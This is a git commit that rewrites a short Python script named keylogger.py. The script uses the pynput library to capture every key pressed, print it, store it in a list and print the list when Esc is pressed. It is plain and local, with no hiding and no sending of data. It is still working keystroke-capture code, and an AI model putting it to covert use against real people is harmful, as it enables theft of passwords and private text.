ee90d2381f33872415ee61ca875f71493a08f780
Benn190 <benhaine99@gmail.com>
2025-01-07 17:53:15 +0000

    prints list of the pressed keys

--- keylogger.py
+++ keylogger.py
@@ -1,24 +1,29 @@
 from pynput import keyboard
 
+key_presses = []
 
-def key_press(key):
-    try:
-        print('alphanumeric key {0} pressed'.format(key.char))
+def add_key(key):
+    key_presses.append(key)
+
+def key_pressed(key):
+    keyPress = '{0}'.format(key)
+    print(keyPress)
+    add_key(keyPress)
+
+def key_released(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+def main():
+    with keyboard.Listener(
+        on_press=key_pressed,
+        on_release=key_released
+    ) as listener:
+        listener.join()
         
-    except AttributeError:
-        print('special key {0} pressed'.format(key))
-    
-def key_release(key):
-    a=1
+    print(key_presses)
 
+if __name__=="__main__":
+    main()
 
-with keyboard.Listener(on_press=key_press,
-        on_release=key_release) as listener:
-    listener.join()
-
-'''
-listener = keyboard.Listener(
-    on_press=key_press,
-    on_release=key_release)
-listener.start()
-'''
